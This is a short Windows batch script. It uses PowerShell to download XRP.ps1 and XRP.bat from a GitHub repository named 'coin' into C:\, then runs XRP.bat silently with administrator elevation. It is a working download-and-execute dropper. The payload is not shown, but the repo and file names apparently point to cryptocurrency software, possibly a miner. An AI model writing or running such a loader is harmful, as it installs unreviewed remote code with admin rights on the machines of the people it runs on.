@echo off
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.ps1' -OutFile 'C:\XRP.ps1'"
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.bat' -OutFile 'C:\XRP.bat'"
powershell -NoProfile -Command "Start-Process -FilePath 'C:\XRP.bat' -ArgumentList '/S' -Verb RunAs"
exit
